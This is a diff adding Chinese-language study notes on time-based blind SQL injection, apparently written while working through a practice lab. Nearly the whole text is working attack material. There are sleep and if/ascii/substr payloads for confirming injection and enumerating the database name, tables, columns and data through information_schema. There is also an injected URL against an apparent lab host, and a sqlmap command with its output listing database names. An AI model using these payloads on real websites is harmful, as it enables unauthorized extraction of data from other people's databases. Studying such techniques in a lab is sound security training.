@@ -1,0 +1,29 @@
+基于时间的盲注（对于没有任何输出可作为判断依据的可采用此法，感觉到明显延迟，则说明猜中）：
+
+1.判断是否存在注入，注入是字符型还是数字型，例：and sleep(5) #
+2.猜解当前数据库名，例：猜长度 and if(length(database())=1,sleep(5),1) # ，逐个猜字符 and if(ascii(substr(database(),1,1))>97,sleep(5),1)
+3.猜解数据库中的表名，例：猜表数量 and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)#，逐个猜表名长度 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1)，再逐个猜表名字符 
+4.猜解表中的字段名，例：猜字段数量 and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)#，逐个猜字段长度 and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # ，再逐个猜字段字符（可用二分法）
+5.猜解数据，先猜数据记录数（可用二分法），再逐个字段猜数据的长度及数据（可用二分法）
+
+
+
+
+
+sleep(10)
+
+http://inject2.lab.aqlab.cn:81/Pass-13/index.php?id=1" and sleep(10)-- qwe
+
+if(条件,成立执行,不成立执行)
+if（1=1，5，6）
+
+if (ascii(substr(database(),1,1))=97,sleep(10),6)-- qwe
+
+获取库名：sqlmap.py -u http://inject2.lab.aqlab.cn:81/Pass-13/index.php?id=1 --level 3 --risk 2 --flush-session
+		库名：
+			[*] error
+			[*] head_error
+			[*] information_schema
+			[*] kanwolongxia
+			[*] post_error
+			[*] widechar
